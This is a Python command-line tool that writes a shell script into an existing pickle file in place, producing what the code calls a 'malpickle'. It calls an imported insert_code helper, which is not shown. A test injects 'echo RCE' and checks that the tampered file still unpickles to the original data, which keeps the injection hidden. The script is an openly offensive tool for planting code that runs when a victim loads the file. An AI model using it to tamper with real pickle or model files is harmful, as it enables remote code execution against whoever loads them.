import argparse

from __init__ import insert_code

def main():
    parser = argparse.ArgumentParser(description="Inject code into pickle files")
    parser.add_argument("pickle_file", help="The pickle file to inject code into")
    parser.add_argument("code_file", help="The shell script to inject")
    #parser.add_argument("-u", "--unittest", help="Only run the unit test; Ignores pickle_file and code_file", type=bool)

    args = parser.parse_args()
#    if args.unittest:
#        return test_insert_code()

    filename = args.pickle_file
    code_file = args.code_file
    with open(filename, "rb+") as pickle_file, open(code_file, 'r') as code_file:
        saved_data = pickle_file.read()
        _malpickle = insert_code(code_file.read(), saved_data)
        pickle_file.truncate(0)
        pickle_file.seek(0)
        pickle_file.write(_malpickle)

def test_insert_code():
    import pickle
    shell_code = "echo RCE"
    data = ({1 : ['a', None, (.1, 0xff)]}, object, tuple)

    saved = pickle.dumps(data)
    malpickle = insert_code(shell_code, saved)

    output = pickle.loads(malpickle)
    assert output == data, (output, data)

if __name__ == "__main__":
    #test_insert_code()
    main()
